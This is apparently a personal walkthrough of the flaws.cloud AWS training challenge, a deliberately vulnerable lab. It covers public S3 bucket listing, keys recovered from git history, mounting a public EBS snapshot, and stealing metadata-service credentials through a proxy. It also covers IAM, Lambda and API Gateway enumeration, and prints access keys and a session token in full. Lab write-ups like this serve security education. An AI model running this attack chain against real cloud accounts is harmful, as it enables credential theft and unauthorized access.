# level 1

```bash
aws s3 ls s3://flaws.cloud/
```

Then go to `http://flaws.cloud/secret-dd02c7c.html`

# level 2

```bash
aws s3 ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/secret-e4443fc.html
```

- Make sure you're authenticated, bc the AWS config to allow to all authenticated users is enabled.
	- This means all authenticated to aws, not all authenticated to your tenant or bucket

# level 3

```bash
aws s3 cp s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ . --recursive
```

Then `git log` and `git checkout f52ec03b227ea6094b04e43f475fb0126edb5a61
` to see `access_keys.txt`

Make new aws profile with `aws configure --profile flaws1`

Then see buckets under that profile:

```bash
aws s3 ls --profile flaws1
```

```
2017-02-12 16:31:07 2f4e53154c0a7fd086a04a12a452c2a4caed8da0.flaws.cloud
2017-05-29 12:34:53 config-bucket-975426262029
2017-02-12 15:03:24 flaws-logs
2017-02-04 22:40:07 flaws.cloud
2017-02-23 20:54:13 level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
2017-02-26 13:15:44 level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
2017-02-26 13:16:06 level4-1156739cfb264ced6de514971a4bef68.flaws.cloud
2017-02-26 14:44:51 level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud
2017-02-26 14:47:58 level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
2017-02-26 15:06:32 theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud
```

# level 4

This one is on EC2: [4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud](http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/)

We want to first get the account ID of the current aws key:

```bash
aws sts get-caller-identity --profile flaws1
```
```
{
    "UserId": "AIDAJQ3H5DC3LEG2BKSLC",
    "Account": "975426262029",
    "Arn": "arn:aws:iam::975426262029:user/backup"
}
```

Now, we have the name of the account (`backup`) and we have the ID, which allows us to filter output

I'm honestly not sure how I'm supposed to identify the region, but apparently its us-west-2. You can put this in configure or pass `--region`

We can then get all EC2 snapshots:

```bash
aws --profile flaws1 ec2 describe-snapshots --owner-id 975426262029
```
```
{
    "Snapshots": [
        {
            "Description": "",
            "Encrypted": false,
            "OwnerId": "975426262029",
            "Progress": "100%",
            "SnapshotId": "snap-0b49342abd1bdcb89",
            "StartTime": "2017-02-28T01:35:12+00:00",
            "State": "completed",
            "VolumeId": "vol-04f1c039bc13ea950",
            "VolumeSize": 8,
            "Tags": [
                {
                    "Key": "Name",
                    "Value": "flaws backup 2017.02.27"
                }
            ],
            "StorageTier": "standard"
        }
    ]
}

```

Now that we have the snapshot ID, we can create a new volume based on the snapshot:
```bash
aws ec2 create-volume --snapshot-id snap-0b49342abd1bdcb89 --availability-zone us-west-2a --region us-west-2
```

Now, we want to make an EC2 instance that uses the volume. 
Make sure that the instance is created in the same availability zone. 

We can then mount the volume in our instance.

From there, we can see a password in `/home/ubuntu/setupNginx.sh`

We can also see the `.bash_history` as root, which shows someone editing nginx `sites-enabled`

The next level is in `/var/www/html/index.html`

http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/
# level 5

The IP `169.254.169.254` is used by AWS, Azure, and GCP as a "metadata service".

This means if we are on an instance, we can use this IP to query metadata.
Alternatively, if there is a proxy (like there is here), we can just query the metadata of the given instance through its own proxy

```bash
curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/
```
```
{
  "Code" : "Success",
  "LastUpdated" : "2024-04-15T05:13:16Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIA6GG7PSQGWBYPVGS4",
  "SecretAccessKey" : "k1ylBj3VO5gNE9euscXMivRjg0vk5fiidH3G+Yn8",
  "Token" : "IQoJb3JpZ2luX2VjEGUaCXVzLXdlc3QtMiJHMEUCIQCvEjktGPYl1vfyxd9+kFjp5T712GyiTDqys1cSbfHo5QIga/zKoYGGTYJWo321o+YIOykn8dOqtuk7cFHALbykT/kquwUInv//////////ARAEGgw5NzU0MjYyNjIwMjkiDPoPzR/1siPBhwt/sCqPBao7KBGZOQwAe+JOc3EqR3pN7FYf1/5CkxwVeWLZnliioq2ScOQdNuW0UwKdSe8ECe7NB4FOL4efGDWRCnG5mLwZFAhBEhR3dUBlP5yQN49Z7AM/IRPfZzP0Nt2IPziIMDWtXqHxWuBEbD3jktdmMniq2CvZR806kKfGitAKM5JoKNsC9qQyq0gTFBKq5soLXKnU8jYOvgb+C65LaAaz7+FcSZWYdOr9/t3ug9kGiOf3PGMRJoItLwpHmkEotNBTaMiq6H+CAOEgsbaTyu7T+FjCbayKVUNUPJcET7OEsmYBcCfedBd4TBrmYYy2lKWjKBK47RWe/JLM8TAKqkp5p+v+qjfrgJ/gAVEdHOepmdgC/TP4afCnDPxw60hjSU5tvkA4TaFVK4BRGBGCfcSttHPjONvBJknaiB84lj84tn7K6N1fODmWPmaOhb1CcobxKIU75fvpXT2CepzTR3/OhzoUCbZ4odicVVROP4gfaxte11jBRKNIhrBwKGSiHuuypsPINzPAh3W+WXMReBQbVZa2Ynqd2NlttfHpiUYyHVPyS79kIs0/bhrHOOMumo74vF3hW1mIpMyd5bibzFC2S+IQwblRrGu6xwPIEHPXWbiENQ1j9t0UlJtHV1dfpc6i8rrzUbbGuYSBe7G9OY5jLI5sxBxjyAuwRleBBCRZAlPjw+5GWtfSHvUP+eeQMJ5QL68iwUMaHuqSHhxTEdyMHlSX+EX9slY/mcD2jXhyJIOOE7FGwWfKORKKpQKuvxAnK7E7fqJtaB9jAWybrX4PcHbGLmIo6qf3bAPr5A5LjmRi5/0uCFtTBwQ43C0MQPzKh4SujXC7pOdVbeOWNMCg+OvAGnx9Ldh6mEyje73BuI8ws+7ysAY6sQE7Y6OU3nDhK5sjCK/KHSsXAXbHjotZ+DLc7SOLxtvMoOuh3PC7CC0h3irosYXhTYX3nVv8sRuft3JfocYentc3k2EBpa3bWGP0Jv+OvpnHg7vFZ7gzTRMazgSkcOKN2VcsutTj4slUvBa7MSHJEkSbRpFcg4NMLcUY/HkSpy4hn3YI44KyM3SW3wTwIxxXu3F0bz1XdkffbR10LkAiWpVj2SHPHvV5TBRpkx3K+72m7Dw=",
  "Expiration" : "2024-04-15T11:25:52Z"
}
```

We can now do `aws configure`. Make sure to set the `aws_session_token` variable in `~/.aws/credentials`

We can now list the contents of the level 6 bucket:

```bash
aws --profile flaws2 s3 ls s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud --recursive

aws --profile flaws2 s3 cp s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud . --recursive
```

We get a new access key for the next level:

```
Access key ID: AKIAJFQ6E7BY57Q3OBGA
Secret: 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
```

# level 6

Let's use cloudfox for this one:

```bash
cloudfox aws all-checks -p flaws3
```

cloudfox will get "the lay of the land" and will show you an inventory that separates things between regions.

We can see from this that the profile is primarily on us-west-2 or global
`/home/adam/.cloudfox/cloudfox-output/aws/flaws3-975426262029/table/inventory.txt`

There is an instance on `35.165.182.7`

A lambda was found. 10 buckets were found

It seems none of this is relevant though. The challenge said our key would have the **SecurityAudit policy** attached to it. I guess this means we were supposed to do IAM.

First, we can get the user attached to our profile:

```bash
aws --profile flaws3 iam get-user
```

The username is `Level6`, so we can now list user policies for that account:

```bash
aws --profile flaws3 iam list-attached-user-policies --user-name Level6
```
```
{
    "AttachedPolicies": [
        {
            "PolicyName": "MySecurityAudit",
            "PolicyArn": "arn:aws:iam::975426262029:policy/MySecurityAudit"
        },
        {
            "PolicyName": "list_apigateways",
            "PolicyArn": "arn:aws:iam::975426262029:policy/list_apigateways"
        }
    ]
}
```

The second policy is custom (isn't online), so we can look it up:

```bash
aws --profile flaws3 iam get-policy  --policy-arn 
```
```
arn:aws:iam::975426262029:policy/list_apigateways
{
    "Policy": {
        "PolicyName": "list_apigateways",
        "PolicyId": "ANPAIRLWTQMGKCSPGTAIO",
        "Arn": "arn:aws:iam::975426262029:policy/list_apigateways",
        "Path": "/",
        "DefaultVersionId": "v4",
        "AttachmentCount": 1,
        "PermissionsBoundaryUsageCount": 0,
        "IsAttachable": true,
        "Description": "List apigateways",
        "CreateDate": "2017-02-20T01:45:17+00:00",
        "UpdateDate": "2017-02-20T01:48:17+00:00",
        "Tags": []
    }
}
```

Now that we see the version ID, we can see the full policy:
```bash
aws --profile flaws3 iam get-policy-version --policy-arn arn:aws:iam::975426262029:policy/list_apigateways --version-id v4
```
```
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Action": [
                        "apigateway:GET"
                    ],
                    "Effect": "Allow",
                    "Resource": "arn:aws:apigateway:us-west-2::/restapis/*"
                }
            ]
        },
        "VersionId": "v4",
        "IsDefaultVersion": true,
        "CreateDate": "2017-02-20T01:48:17+00:00"
    }
}
```
This tells us that the policy allows us to do a `GET` on `/restapis/*`

This is likely where the lambda we found previously comes into play.

We can list the lambdas with
```bash
aws --profile flaws3 lambda list-functions --region us-west-2
```
```
{
    "Functions": [
        {
            "FunctionName": "Level6",
            "FunctionArn": "arn:aws:lambda:us-west-2:975426262029:function:Level6",
            "Runtime": "python2.7",
            "Role": "arn:aws:iam::975426262029:role/service-role/Level6",
            "Handler": "lambda_function.lambda_handler",
            "CodeSize": 282,
            "Description": "A starter AWS Lambda function.",
            "Timeout": 3,
            "MemorySize": 128,
            "LastModified": "2017-02-27T00:24:36.054+0000",
            "CodeSha256": "2iEjBytFbH91PXEMO5R/B9DqOgZ7OG/lqoBNZh5JyFw=",
            "Version": "$LATEST",
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "d45cc6d9-f172-4634-8d19-39a20951d979",
            "PackageType": "Zip",
            "Architectures": [
                "x86_64"
            ],
            "EphemeralStorage": {
                "Size": 512
            },
            "SnapStart": {
                "ApplyOn": "None",
                "OptimizationStatus": "Off"
            }
        }
    ]
}
```

There is a function called `Level6` 

Because we have `SecurityAudit`, we can get the attached policies to the lambda:

```bash
aws --profile flaws3 lambda get-policy --function-name Level6  --region us-west-2
```
```
{
    "Policy": "{\"Version\":\"2012-10-17\",\"Id\":\"default\",\"Statement\":[{\"Sid\":\"904610a93f593b76ad66ed6ed82c0a8b\",\"Effect\":\"Allow\",\"Principal\":{\"Service\":\"apigateway.amazonaws.com\"},\"Action\":\"lambda:InvokeFunction\",\"Resource\":\"arn:aws:lambda:us-west-2:975426262029:function:Level6\",\"Condition\":{\"ArnLike\":{\"AWS:SourceArn\":\"arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6\"}}}]}",
    "RevisionId": "d45cc6d9-f172-4634-8d19-39a20951d979"
}
```

This tells us that there is a rest-api-id called `s33ppypa75`. We can execute `arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6`
	It should be noted that all of this was in cloudfox so far

We can now see the stages of the api gateway with:

```bash
aws --profile flaws3 apigateway get-stages --rest-api-id "s33ppypa75" --region us-west-2
```
```
{
    "item": [
        {
            "deploymentId": "8gppiv",
            "stageName": "Prod",
            "cacheClusterEnabled": false,
            "cacheClusterStatus": "NOT_AVAILABLE",
            "methodSettings": {},
            "tracingEnabled": false,
            "createdDate": "2017-02-26T19:26:08-05:00",
            "lastUpdatedDate": "2017-02-26T19:26:08-05:00"
        }
    ]
}
```

Here, we can see a stage called `Prod`

We can build the url for the lambda as follows:

```
https://{rest-api-id}.execute-api.{region}.amazonaws.com/{stage name}/{function name}

https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6
```

Browsing to that site tells us to go to http://theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud/d730aa2b
